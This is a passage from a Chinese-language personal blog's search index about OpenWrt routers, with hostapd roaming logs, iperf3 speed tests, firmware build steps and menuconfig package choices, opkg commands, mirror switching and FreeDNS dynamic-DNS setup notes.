2a:85:8f:ff:be:e3 MLME: MLME-DISASSOCIATE.indication(2a:85:8f:ff:be:e3, 4)\nThu Aug 17 11:36:38 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 11:36:39 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: deauthenticated due to inactivity (timer DEAUTH/REMOVE)\nThu Aug 17 11:36:39 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DEAUTHENTICATE.indication(2a:85:8f:ff:be:e3, 2)\nThu Aug 17 11:36:39 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\n</code></pre></p> <p>op3(ax6s) <pre><code>Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authentication OK (FT)\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, FT)\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 1)\nThu Aug 17 11:30:57 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 1)\nThu Aug 17 11:30:57 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-REASSOCIATE.indication(2a:85:8f:ff:be:e3)\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 6 notification\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: FT authentication already completed - do not start 4-way handshake\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5176\u5b83","title":"\u5176\u5b83","text":"<p>\u539f\u5382\u7cfb\u7edf  \u652f\u6301\u7684\u529f\u80fd </p> <p>\u4ece\u54b8\u9c7c\u4e0a\u4e70\u7684\uff0c\u8def\u7531\u5668\u7cfb\u7edf\u91cc\u53ef\u4ee5\u770b\u52301\u6708\u4efd\u7684\u65e5\u5fd7\u3002 </p> <p>uboot\u63a7\u5236\u53f0 </p> <p></p> <p>webui\u5237\u673a\u65f6\u4e32\u53e3\u8f93\u51fa </p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u786c\u4ef6\u6027\u80fd\u6d4b\u8bd5wg\u5e26\u5bbd","title":"\u786c\u4ef6\u6027\u80fd\u6d4b\u8bd5(wg\u5e26\u5bbd)","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#king3399","title":"king3399","text":"<p>\u672a\u52a0\u5bc6 <pre><code>root@op1 \u279c  ~ iperf3 -c 114.214.236.90\n\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.10 GBytes   943 Mbits/sec   70             sender\n[  5]   0.00-10.05  sec  1.09 GBytes   936 Mbits/sec                  receiver\n\nroot@op1 \u279c  ~ iperf3 -c king6.yfycloud.top\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.08 GBytes   924 Mbits/sec   29             sender\n[  5]   0.00-10.04  sec  1.07 GBytes   918 Mbits/sec                  receiver\n</code></pre></p> <p>wg <pre><code>\u279c  ~ iperf3 -c king\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.04 GBytes   893 Mbits/sec  70559             sender\n[  5]   0.00-10.04  sec  1.04 GBytes   887 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c king -R\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.04  sec   691 MBytes   577 Mbits/sec    2             sender\n[  5]   0.00-10.00  sec   688 MBytes   577 Mbits/sec                  receiver\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#p2w","title":"p2w","text":"<p>\u672a\u52a0\u5bc6\uff0c\u5c45\u7136\u8dd1\u4e0d\u6ee1\u5343\u5146\uff08\u8fde\u63a5\u4e2d\u95f4\u901a\u8fc7\u4e86\u4e00\u4e2ausb \u5343\u5146\u7f51\u5361\uff09 <pre><code>\u279c  ~ iperf3 -c p2w\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec   754 MBytes   633 Mbits/sec  344             sender\n[  5]   0.00-10.00  sec   752 MBytes   630 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c p2w -R\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.01  sec   902 MBytes   757 Mbits/sec  738             sender\n[  5]   0.00-10.00  sec   902 MBytes   757 Mbits/sec                  receiver\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#ax6s_1","title":"ax6s","text":"<p>\u672a\u52a0\u5bc6\uff08\u4e2d\u95f4\u662f\u4e00\u4e2ausb\u5343\u5146\u7f51\u5361\uff09 <pre><code>(base) yfy@Tianyi \u279c  ~ iperf3 -c 192.168.36.2\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.10 GBytes   942 Mbits/sec    0             sender\n[  5]   0.00-10.01  sec  1.09 GBytes   939 Mbits/sec                  receiver\n\n(base) yfy@Tianyi \u279c  ~ iperf3 -c 192.168.36.2 -R\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.09 GBytes   940 Mbits/sec    0             sender\n[  5]   0.00-10.00  sec  1.09 GBytes   939 Mbits/sec                  receiver\n</code></pre></p> <p>wg \u590d\u7528\u4e4b\u524d\u7684home\u5230\u5b66\u6821\u6570\u636e baseline\uff1aipv6\u76f4\u8fde <pre><code>home\u4e0b\u8f7d\n[SUM]   0.00-10.00  sec   798 MBytes   669 Mbits/sec  468             sender\n[SUM]   0.00-10.05  sec   786 MBytes   656 Mbits/sec                  receiver\n\nhome\u4e0a\u4f20\n[SUM]   0.00-10.06  sec   925 MBytes   771 Mbits/sec  1185             sender\n[SUM]   0.00-10.00  sec   918 MBytes   770 Mbits/sec                  receiver\n</code></pre></p> <p><pre><code>\u279c  ~ iperf3 -c op3\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec   163 MBytes   137 Mbits/sec    0             sender\n[  5]   0.00-10.05  sec   161 MBytes   134 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c op3 -P 5\n[SUM]   0.00-10.00  sec   537 MBytes   450 Mbits/sec  302             sender\n[SUM]   0.00-10.06  sec   525 MBytes   438 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c op3 -R\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.05  sec   235 MBytes   196 Mbits/sec  170             sender\n[  5]   0.00-10.00  sec   234 MBytes   196 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c op3 -R -P 5\n[SUM]   0.00-10.05  sec   504 MBytes   421 Mbits/sec    0             sender\n[SUM]   0.00-10.00  sec   497 MBytes   417 Mbits/sec                  receiver\n</code></pre> \u6050\u6016\u7684CPU\u5360\u7528 </p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/","title":"openwrt\u7f16\u8bd1","text":"<p>openwrt\u7f16\u8bd1</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#openwrt-\u7f16\u8bd1","title":"Openwrt \u7f16\u8bd1","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u81ea\u5df1\u7f16\u8bd1\u4f18\u70b9","title":"\u81ea\u5df1\u7f16\u8bd1\u4f18\u70b9","text":"<ol> <li>\u56fa\u4ef6\u4f53\u79ef\u51cf\u5c0f\uff08\u9700\u8981\u5b89\u88c5\u7684package\u88ab\u538b\u7f29\u5230\u955c\u50cf\u4e2d\uff09</li> <li>\u53ef\u4ee5\u5b9a\u5236\u4e00\u4e9b\u9700\u8981\u7684\u9009\u9879\uff08busybox\u53ef\u4ee5\u9009\u62e9zsh\uff09</li> <li>\u4e0b\u6b21\u5237\u673a\uff0c\u53ef\u4ee5\u4e0d\u7528\u8fdb\u884c\u8f6f\u4ef6\u5b89\u88c5\uff0c\u914d\u7f6e <p>The main advantage of building your own firmware is that it compresses the files, so that you will have room for much more stuff. It is particularly noticeable on routers with 16 MB flash RAM or less. It also lets you change some options that can only be changed at build time, for instance the features included in BusyBox and the block size of SquashFS. Larger block size will give better compression, but may also slow down the loading of files. (ref: [OpenWrt Wiki] Quick image building guide)</p> </li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#openwrt-build-system\u7279\u70b9","title":"Openwrt Build System\u7279\u70b9","text":"<ul> <li> <p>\u4e0d\u7528\u914d\u7f6e\u7f16\u8bd1\u94fe</p> <p>While it is possible to manually create your toolchain, and then build OpenWrt with it, this is difficult and error-prone. The OpenWrt build system takes a different approach to building a firmware: it downloads, patches and compiles everything from scratch, including the cross compiler. Or to put it in simpler terms, OpenWrt's build system doesn't contain any executables or even sources. It is an automated system for downloading the sources, patching them to work with the given platform and compiling them correctly for the platform. What this means is that just by changing the template, you can change any step in the process. And of course the side benefit of this is that builds are automated, which saves time and guarantees the same result every time. For example if a new kernel is released, a simple change to one of the Makefiles will download the latest kernel, patch it to run on the requested platform and produce a new firmware image. There's no work to be done trying to track down an unmodified copy of the existing kernel to see what changes had been made - the patches are already provided and the process ends up almost completely transparent. This doesn't just apply to the kernel, but to anything included with OpenWrt - it's this strategy that allows OpenWrt to stay on the bleeding edge with the latest compilers, kernels and applications. (ref: [OpenWrt Wiki] Build system essentials)</p> </li> <li> <p>\u7f16\u8bd1\u51fa\u6765\u7684toolchain\u4f4d\u7f6e</p> <p><code>staging_dir/toolchain\u2026</code> is a mini Linux root with its own <code>bin/</code>, <code>lib/</code>, etc that contains the cross C compiler used to build the rest of the firmware. You can actually use that to compile simple C programs outside of OpenWRT that can be loaded onto the firmware. The C compiler might be something like: <code>staging_dir/toolchain-mips_34kc_gcc-4.8-linaro_uClibc-0.9.33.2/bin/mips-openwrt-linux-uclibc-gcc</code>. You can see the version of the CPU, the C library and gcc encoded into it; this allows multiple targets to be built in the same area concurrently.</p> </li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#openwrt-git\u5206\u652f","title":"openwrt git\u5206\u652f","text":"<p>\u56fe\u4e2d\u84dd\u8272\u4e3amaster\u5206\u652f\uff0c\u7eff\u8272\u4e3a21.02\u7a33\u5b9a\u7248\u5206\u652f\uff0c\u6a59\u8272\u4e3aLEDE19.07\u5206\u652f\uff0c\u800c\u7c89\u8272\u7684\u4e3a\u65b0\u768422.03\u6d4b\u8bd5\u7248\u5206\u652f\u3002\u53ef\u4ee5\u770b\u5230AX6S\u6700\u65e9\u5728master\u5206\u652f\u4e2d\u5f97\u5230\u652f\u6301\uff0c\u7136\u540e\u4e0d\u4e45\u4fbf\u572822.03\u4e2d\u5f97\u5230\u4e86\u6dfb\u52a0\u3002</p> <ul> <li>\u597d\u5947\u4e3a\u4f55\u4e0d\u4f7f\u7528merge </li> </ul> <p>21.02\u7a33\u5b9a\u7248\u5206\u652f\uff0c\u5f53\u521d\u4e5f\u662f\u4ecemaster\u5206\u652f\u4e2d\u5206\u79bb\u51fa\u6765\u7684</p> <p></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#immortalwrt","title":"immortalwrt","text":"<ul> <li>immortalwrt/immortalwrt: An opensource OpenWrt variant for mainland China users. (github.com) \u6709\u4ee5\u4e0b\u8fd9\u4e9b\u5206\u652f\u3002\u5f00\u53d1\u6d41\u7a0b\u4e3a\u5c06\u5b98\u65b9\u5206\u652f\u5408\u5e76\u5230\u81ea\u5df1\u7684\u5206\u652f\u3002\u4f46\u662f21.02\u7a33\u5b9a\u7248\u4ecd\u7136\u6ca1\u6709AX6S\u7684\u652f\u6301\uff0c\u7f51\u4e0a\u770b\u5230\u7684\u662f18.06-k5.4\u5206\u652f\u7684</li> <li>AX6S \u95ed\u6e90\u65e0\u7ebf\u9a71\u52a8Openwrt \u5237\u673a\u6559\u7a0b/\u56fa\u4ef6\u4e0b\u8f7d-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn) <pre><code>* openwrt-21.02\n  remotes/origin/HEAD -&gt; origin/openwrt-21.02\n  remotes/origin/master\n  remotes/origin/openwrt-18.06\n  remotes/origin/openwrt-18.06-k5.4\n  remotes/origin/openwrt-21.02\n</code></pre></li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u7f16\u8bd1\u547d\u4ee4","title":"\u7f16\u8bd1\u547d\u4ee4","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u4f9d\u8d56","title":"\u4f9d\u8d56","text":"<p>\u6839\u636e[OpenWrt Wiki] Build system setup\u5b89\u88c5\u5bf9\u5e94</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u7f16\u8bd1","title":"\u7f16\u8bd1","text":"<ul> <li>\u53c2\u8003\uff1a</li> <li>\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] Build system usage</li> <li>\u975e\u5e38\u597d\u7684\u4e00\u4e2a\u6559\u7a0b\uff1aHow To Compile OpenWrt Firmware For Any Router \u00b7 GitHub</li> <li>\u547d\u4ee4\u6c47\u603b</li> </ul> <pre><code># Download and update the sources\ngit clone https://git.openwrt.org/openwrt/openwrt.git\ncd openwrt\ngit pull\n\n# Select a specific code revision\ngit branch -a\ngit tag\ngit checkout v21.02.1\n\n# Update the feeds\n./scripts/feeds update -a\n./scripts/feeds install -a\n\n# Configure the firmware image and the kernel\nmake menuconfig\n#make kernel_menuconfig\n\n#download all dependency source files before final make, enables multi-core compilation\nmake download\n\n# Build the firmware image\n#make (or make world)\n#when faild, V=s show all command executed\n#make V=s\n\nmake -j $(nproc) 2&gt;&amp;1 | teemake.log\n</code></pre> <ul> <li>Cleaning Up   <pre><code>make clean #deletes contents of the directories /bin and /build_dir. make clean does not remove the toolchain, it also avoids cleaning architectures/targets other than the one you have selected in your .config\n\nmake dirclean #deletes contents of the directories /bin and /build_dir and additionally /staging_dir and /toolchain (=the cross-compile tools) and /logs. 'Dirclean' is your basic \"Full clean\" operation.\n\nmake distclean #nukes everything you have compiled or configured and also deletes all downloaded feeds contents and package sources.\n\n#clean small part\nmake target/linux/clean       #Clean linux objects \nmake package/base-files/clean     #Clean package base-files objects\nmake package/luci/clean       #Clean luci\n</code></pre></li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u7f16\u8bd1\u914d\u7f6e","title":"\u7f16\u8bd1\u914d\u7f6e","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#menuconfig","title":"menuconfig","text":"<ul> <li>Target System(MediaTek Ralink MIPS)</li> <li>Subtarget(MT7621 based boards)</li> <li>Target Profile(Xiaomi Redmi Router AC2100)</li> <li>Target Images</li> <li>\u53d6\u6d88\u52fe\u9009ramdisk\uff0c\u5426\u8005\u4f1a\u751f\u6210<code>openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-initramfs-kernel.bin</code></li> <li>\u52fe\u9009squashfs\uff0c\u53ef\u4ee5\u8c03\u8282block size\uff08\u9ed8\u8ba4256B\uff09\uff0c\u8d8a\u5927\u7684\u5757\u538b\u7f29\u7387\u66f4\u597d\uff0c\u4f46\u8bfb\u53d6\u901f\u5ea6\u66f4\u6162\uff08\u53ef\u80fd\u5f71\u54cd\u91cd\u542f\u901f\u5ea6\uff1f\uff09</li> <li>Build the Openwrt SDK\uff1a\u4e00\u4e2a\u5c0f\u7684buildroot\uff0c\u7528\u4e8e\u6d4b\u8bd5\u81ea\u5df1\u7684package</li> <li>Package the Openwrt-based Toolchain\uff1a\u4ea4\u53c9\u7f16\u8bd1\u94fe</li> <li>Base system</li> <li>\u4f7f\u7528Openclash\u9700\u8981\u53d6\u6d88\u52fe\u9009dnsmasq\uff08\u5df2\u7ecf\u52fe\u9009dnsmasq-full\uff09</li> <li>\u4e2d\u6587\u4e71\u7801\uff1amake menuconfig-&gt;Base System-&gt;busybox-&gt;Customize busybox option-&gt;Settings-&gt;support unicode\u9009\u9879\uff08\u4f4d\u4e8e\u7ed3\u5c3e\uff09\u52fe\u4e0a\u540e\uff0c\u52fe\u4e0a\u9009\u9879Check $LANG environment variable</li> <li>Administration</li> <li>htop</li> <li>Development</li> <li>gcc, gdb\u7b49\u5de5\u5177</li> <li>Fonts</li> <li>DejaVu\u5b57\u4f53</li> <li>Kernel modules</li> <li>Other modules: kmod-mtd-rw\uff1a\u5f00\u542fuboot\u7b49flash\u5206\u533a\u5199\u6743\u9650</li> <li>USB support: <code>kmod-usb-core kmod-usb-storage kmod-usb-uhci kmod-usb2 kmod-usb3</code></li> <li>Video support: kmod-video-core kmod-video-uvc</li> <li>Languages</li> <li>python\uff1arequests, lxml</li> <li>Luci</li> <li>Collections<ul> <li>Luci\uff1a\u5426\u5219\u6ca1\u6709\u56fe\u5f62\u754c\u9762</li> </ul> </li> <li>Module<ul> <li>luci-compat\uff1a\u636e\u8bf4\u662f\u5fc5\u8981\u7684</li> </ul> </li> <li>Application<ul> <li>adblock</li> <li>ddns</li> <li>Openclash\uff08\u9700\u8981\u81ea\u5df1\u6dfb\u52a0\uff09</li> <li>qos</li> <li>samba4: usb\uff08\u9700\u8981usb\u6302\u8f7d\u4e1c\u897f\u7684\u8bdd\uff09</li> <li>upnp</li> <li>wireguard</li> <li>wol</li> </ul> </li> <li>Network</li> <li>Files Transfer: curl</li> <li>VPN: zerotier</li> <li>immortalwrt\u9700\u8981\u5f00\u542f: odhcp6c, odhcpd-ipv6only\uff0c\u5426\u5219ipv6\u65e0\u6cd5\u4f7f\u7528</li> <li>WirelessPAD:<ul> <li>wpad-openssl\uff1a\u6700\u5b8c\u6574</li> <li>wpad-mesh-openssl</li> <li>wpad-basic-openssl</li> </ul> </li> <li>Utilities</li> <li>Editors\uff1avim-full\uff08\u53ea\u80fd\u9009\u4e00\u4e2a\uff09</li> <li>Shells\uff1abash, zsh</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#usb","title":"usb","text":"<pre><code>#kmod &gt; usb support\nkmod-usb-core kmod-usb-storage kmod-usb-uhci kmod-usb2 kmod-usb3\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#webcam","title":"webcam","text":"<pre><code>#kmod &gt; video support\nkmod-video-core kmod-video-uvc\n\n#Multimedia\nmjpg-streamer\ninput-uvc\noutput-rtsp\nwww-simple\n\n#luci\nluci-app-mjpg-streamer\n\n#utils(optional)\nuvcdynctrl\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#opkg\u5b89\u88c5\u5176\u5b83\u8f6f\u4ef6","title":"opkg\u5b89\u88c5\u5176\u5b83\u8f6f\u4ef6","text":"<p>\u5fc5\u5907 <pre><code>opkg install zerotier luci-app-wireguard luci-app-ddns\n</code></pre></p> <p>\u6709\u7528 <pre><code>opkg install htop vim-full curl bind-dig mtr-json tmux iperf3 tcpdump \n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#mesh","title":"mesh","text":"<pre><code>opkg list-installed |grep wpad\nopkg remove wpad-basic-wolfssl #\u4e0a\u4e00\u6b65\u8f93\u51fa\nopkg install wpad-mesh-openssl\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#immortalwrt_1","title":"immortalwrt","text":"<p>interface wan6\u663e\u793a\u4e0d\u652f\u6301\u7684\u534f\u8bae\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5\u4ee5\u4e0b\u8f6f\u4ef6\uff0c\u5e76restart network <pre><code>odhcp6c odhcpd-ipv6only\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u95ed\u6e90\u9a71\u52a8","title":"\u95ed\u6e90\u9a71\u52a8","text":"<p>\u770b\u5230\u5f88\u591a\u975eopenwrt\u5b98\u65b9\u56fa\u4ef6\u90fd\u63d0\u5230\u4e86\u95ed\u6e90\u9a71\u52a8\u56e0\u6b64\u4e86\u89e3\u4e86\u4e00\u6ce2 \u5927\u6982\u5c31\u662fMTK\u6709mt76\u65e0\u7ebf\u7684\u9a71\u52a8\u4ee3\u7801\uff0c\u4f46\u662fopenwrt\u5185\u4f7f\u7528\u7684\u662f\u81ea\u5df1\u5f00\u53d1\u7684\u9a71\u52a8\u3002 Mt76 driver - replacement [for test] - For Developers - OpenWrt Forum openwrt/feeds/mtk-openwrt-feeds - Gitiles (mediatek.com)</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u8bb0\u5f55","title":"\u8bb0\u5f55","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u65e05ghz\u65e0\u7ebf","title":"\u65e05Ghz\u65e0\u7ebf","text":"<p>\u521a\u5f00\u59cb\u7f16\u8bd1\u4e86rm2100\uff0cmake clean\u540e\uff0c\u7f16\u8bd1\u4e86r3g\u3002\u7ed3\u679c\u53d1\u73b0\u4e00\u5207\u90fd\u597d\uff0c\u5c31\u662f\u6ca1\u67095Ghz\u65e0\u7ebf\u3002\u800c\u4f7f\u7528\u5b98\u65b9\u7248\u672c\u662f\u6709\u7684\u3002 \u5c1d\u8bd5make dirclean\u540e(full clean)\uff0c\u91cd\u65b0\u7f16\u8bd1\uff0c\u95ee\u9898\u89e3\u51b3\u3002</p> <p>\u53d1\u73b0\u5728\u4e0d\u540c\u8bbe\u5907\u4e0a\u90fd\u9047\u5230\u8fc7\u8fd9\u4e2a\u95ee\u9898\uff0c\u6682\u4e0d\u6e05\u695a\u662f\u54ea\u4e00\u6b65\u5bfc\u81f4\u7684</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E7%BC%96%E8%AF%91/#\u6d4b\u901f\u901f\u5ea6\u6162","title":"\u6d4b\u901f\u901f\u5ea6\u6162","text":"<p>\u6d4b\u901f\u4e0a\u4f20\u4e0b\u8f7d\u90fd\u662f300\u5de6\u53f3 \u5c1d\u8bd5\u4fdd\u5b58\u914d\u7f6e\u540e\uff0c\u5728\u7cfb\u7edf\u4e2dreset\uff0c\u7136\u540e\u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u3002 - reset\u540e\uff0c\u901f\u5ea6\u5f88\u5feb\uff0c\u57fa\u672c\u4e0a\u4e0a\u4f20\u53ef\u4ee5\u5230600-700\uff0c\u4e0b\u8f7d900-1000 - \u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u540e\uff0c\u901f\u5ea6\u4f9d\u65e7\u5f88\u5feb</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/","title":"openwrt\u914d\u7f6e","text":"<p>openwrt\u6362\u6e90 OpenWRT/LEDE \u6e90\u4f7f\u7528\u5e2e\u52a9 \u2014 USTC Mirror Help \u6587\u6863 <pre><code>sed -i 's/downloads.openwrt.org/mirrors.ustc.edu.cn\\/openwrt/g' /etc/opkg/distfeeds.conf\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7b2c\u4e09\u65b9\u8f6f\u4ef6","title":"\u7b2c\u4e09\u65b9\u8f6f\u4ef6","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ddns","title":"DDNS","text":"<pre><code>opkg install luci-app-ddns ddns-scripts-freedns\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#freedns","title":"FreeDNS","text":"<p>FreeDNS\u662f\u4e00\u4e2a\u514d\u8d39\u63d0\u4f9bDDNS\u670d\u52a1\u7684\u7f51\u7ad9\uff0c\u4e0a\u9762\u6709\u8bb8\u591a\u4eba\u5206\u4eab\u4e86\u81ea\u5df1\u7684\u4e00\u7ea7\u57df\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e0a\u9762\u6ce8\u518c\u81ea\u5df1\u7684\u4e8c\u7ea7\u57df\u540d\u3002</p> <p>\u4ee5\u4e0b\u662fFreeDNS\u5404\u9875\u9762\u529f\u80fd\u7684\u4ecb\u7ecd</p> <ul> <li> <p>Subdomains\u9875\u9762</p> </li> <li> <p>\u7528\u4e8e\u6dfb\u52a0\u548c\u7ba1\u7406\u81ea\u5df1\u7684\u5b50\u57df\u540d</p> <ul> <li>\u6dfb\u52a0\u65f6\u7c7b\u578bA\u8868\u793a\u5c06\u5b50\u57df\u540d\u6620\u5c04\u5230\u4e00\u4e2aipv4\u5730\u5740\u4e0a</li> <li>\u7c7b\u578bAAAA\u8868\u793a\u6620\u5c04\u5230ipv6\u5730\u5740\u4e0a</li> <li>CNAME\u8868\u793a\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u57df\u540d</li> </ul> <p></p> </li> <li> <p>Dynamic DNS\u9875\u9762</p> </li> <li> <p>\u5305\u542b\u5404\u79cd\u914d\u7f6eDDNS\u7684\u65b9\u5f0f\uff0c\u89c1\u4e0b\u8282</p> </li> <li> <p>Registry\u9875\u9762</p> </li> <li> <p>\u5305\u542b\u6240\u6709\u53ef\u9009\u57df\u540d</p> </li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<ul> <li> <p>\u65b9\u5f0f\u4e00\uff1a\u4f7f\u7528crontab\u811a\u672c\uff08\u6700\u7b80\u5355\uff09</p> </li> <li> <p>ipv4</p> <p>\u5728FreeDNS Dynamic DNS\u9875\u9762\uff0c\u5728\u6bcf\u4e2a\u5b50\u57df\u540d\u5904\uff0c\u6709\u5bf9\u5e94\u7684quick cron example\u3002\u5c06\u5176\u6dfb\u52a0\u5230crontab\u4e2d\u5373\u53ef\u3002</p> <p></p> <p>\u6ce8\uff1a\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u65e0\u6cd5\u66f4\u65b0ipv6\u5730\u5740\uff0c\u4f1a\u5c06ipv4\u5730\u5740\u66f4\u65b0\u7ed9\u57df\u540d</p> </li> <li> <p>ipv6</p> <p>\u5728Get your update URLs (afraid.org)\u4e2d\u5f00\u542fRandomized Update Token</p> <p></p> <p>\u4f7f\u7528\u8fd9\u91cc\u7684cron script\uff0c\u5176\u4e2d\u4f1a\u8bbf\u95eev6.sync.afraid.org\uff0c\u53ef\u4ee5\u66f4\u65b0ipv6</p> </li> <li> <p>\u65b9\u5f0f\u4e8c\uff1a\u4f7f\u7528openwrt\u63d2\u4ef6</p> </li> <li> 